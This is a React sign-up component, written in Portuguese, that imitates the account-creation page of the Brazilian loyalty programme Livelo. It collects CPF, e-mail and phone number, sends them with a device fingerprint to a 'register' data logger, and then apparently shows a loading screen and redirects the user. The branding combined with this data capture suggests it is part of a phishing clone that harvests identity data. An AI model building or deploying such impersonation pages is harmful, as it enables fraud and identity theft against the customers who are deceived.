import React, { useState } from "react";
import {
  formatCPF,
  formatPhone,
  isValidCPF,
  isValidEmail,
  isValidPhone,
} from "../utils/validators";
import { saveUserData } from "../services/api";
import { getDeviceString } from "../utils/deviceDetect";
import "./CreateAccount.css";

const CreateAccount = ({ onAccountCreated, onBack }) => {
  const [cpf, setCpf] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [acceptTerms, setAcceptTerms] = useState(false);
  const [cpfError, setCpfError] = useState("");
  const [emailError, setEmailError] = useState("");
  const [phoneError, setPhoneError] = useState("");

  const handleCpfChange = (e) => {
    const formatted = formatCPF(e.target.value);
    setCpf(formatted);
    setCpfError("");
  };

  const handleCpfBlur = () => {
    if (cpf.trim() !== "" && !isValidCPF(cpf)) {
      setCpfError("CPF inválido");
    }
  };

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
    setEmailError("");
  };

  const handleEmailBlur = () => {
    if (email.trim() !== "" && !isValidEmail(email)) {
      setEmailError("E-mail inválido");
    }
  };

  const handlePhoneChange = (e) => {
    const formatted = formatPhone(e.target.value);
    setPhone(formatted);
    setPhoneError("");
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Validações finais
    let hasError = false;

    if (!isValidCPF(cpf)) {
      setCpfError("CPF inválido");
      hasError = true;
    }

    if (!isValidEmail(email)) {
      setEmailError("E-mail inválido");
      hasError = true;
    }

    if (!isValidPhone(phone)) {
      setPhoneError("Número de celular inválido. Use (DD) 9XXXX-XXXX");
      hasError = true;
    }

    if (!acceptTerms) {
      hasError = true;
    }

    if (hasError) return;

    // Salva dados no banco de dados
    try {
      await saveUserData({
        type: "register",
        cpf,
        email,
        phone,
        device: getDeviceString(),
      });

      console.log("Conta criada e dados salvos no banco!");
    } catch (error) {
      console.error("Erro ao salvar dados:", error);
    }

    console.log("Criando conta:", { cpf, email, phone });

    // Chama a função que vai mostrar loading e redirecionar
    if (onAccountCreated) {
      onAccountCreated({ cpf, email, phone });
    }
  };

  const isFormValid =
    cpf.trim() !== "" &&
    email.trim() !== "" &&
    phone.trim() !== "" &&
    acceptTerms &&
    isValidCPF(cpf) &&
    isValidEmail(email) &&
    isValidPhone(phone);

  return (
    <div className="create-container">
      <div className="create-box">
        {/* Logo */}
        <div className="logo">
          <img src="/logo-livelo.svg" alt="Livelo" />
        </div>

        {/* Título */}
        <h1 className="create-title">Crie sua conta Livelo</h1>

        {/* Formulário */}
        <form className="create-form" onSubmit={handleSubmit}>
          {/* Campo CPF */}
          <div className="input-group">
            <div className="input-wrapper">
              <input
                type="text"
                id="cpf"
                value={cpf}
                onChange={handleCpfChange}
                onBlur={handleCpfBlur}
                className={`create-input ${cpfError ? "error" : ""}`}
                placeholder=" "
                maxLength={14}
              />
              <label htmlFor="cpf" className="floating-label">
                CPF
              </label>
              <span className="input-icon">
                <svg
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                >
                  <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                  <circle cx="12" cy="7" r="4" />
                </svg>
              </span>
            </div>
            <span className="input-hint">Ex:123.456.789-10</span>
            {cpfError && <span className="error-message">{cpfError}</span>}
          </div>

          {/* Campo E-mail */}
          <div className="input-group">
            <div className="input-wrapper">
              <input
                type="email"
                id="email-create"
                value={email}
                onChange={handleEmailChange}
                onBlur={handleEmailBlur}
                className={`create-input ${emailError ? "error" : ""}`}
                placeholder=" "
              />
              <label htmlFor="email-create" className="floating-label">
                E-mail
              </label>
              <span className="input-icon">
                <svg
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                >
                  <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
                  <polyline points="22,6 12,13 2,6" />
                </svg>
              </span>
            </div>
            <span className="input-hint">Ex: seuemail@dominio.com</span>
            {emailError && <span className="error-message">{emailError}</span>}
          </div>

          {/* Campo Telefone */}
          <div className="input-group">
            <div className="input-wrapper">
              <input
                type="tel"
                id="phone-create"
                value={phone}
                onChange={handlePhoneChange}
                onBlur={() => {
                  if (phone.trim() !== "" && !isValidPhone(phone)) {
                    setPhoneError("Número de celular inválido. Use (DD) 9XXXX-XXXX");
                  }
                }}
                className={`create-input ${phoneError ? "error" : ""}`}
                placeholder=" "
                maxLength={15}
              />
              <label htmlFor="phone-create" className="floating-label">
                Celular
              </label>
              <span className="input-icon">
                <svg
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                >
                  <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z" />
                </svg>
              </span>
            </div>
            <span className="input-hint">Ex: (11) 99999-9999</span>
            {phoneError && <span className="error-message">{phoneError}</span>}
          </div>

          {/* Checkbox Termos */}
          <div className="checkbox-group">
            <label className="checkbox-label">
              <input
                type="checkbox"
                checked={acceptTerms}
                onChange={(e) => setAcceptTerms(e.target.checked)}
                className="checkbox-input"
              />
              <span className="checkbox-text">
                Concordo que a Livelo salve meus dados para um possível contato
                no caso de não finalizar esse cadastro.
              </span>
            </label>
          </div>

          {/* Botão Criar Conta */}
          <button
            type="submit"
            className={`create-button ${isFormValid ? "active" : ""}`}
            disabled={!isFormValid}
          >
            Criar conta
          </button>
        </form>

        {/* Ajuda */}
        <div className="create-help">
          <p>
            Clique em{" "}
            <a href="#ajuda" className="help-link">
              não consigo criar minha conta
            </a>{" "}
            se estiver tendo problemas para criá-la.
          </p>
        </div>

        {/* Divisor */}
        <div className="divider"></div>

        {/* Já tem conta */}
        <div className="already-have-account">
          <p>
            Já tem sua conta?{" "}
            <button onClick={onBack} className="login-link">
              Faça o login
            </button>
          </p>
        </div>

        {/* Divisor */}
        <div className="divider"></div>

        {/* Termos */}
        <div className="create-terms">
          <p>
            Ao criar sua conta, você concorda com os nossos{" "}
            <a href="#termos" className="terms-link">
              Termos de uso
            </a>{" "}
            e com nossa{" "}
            <a href="#privacidade" className="terms-link">
              Política de privacidade
            </a>
            .
          </p>
        </div>
      </div>
    </div>
  );
};

export default CreateAccount;
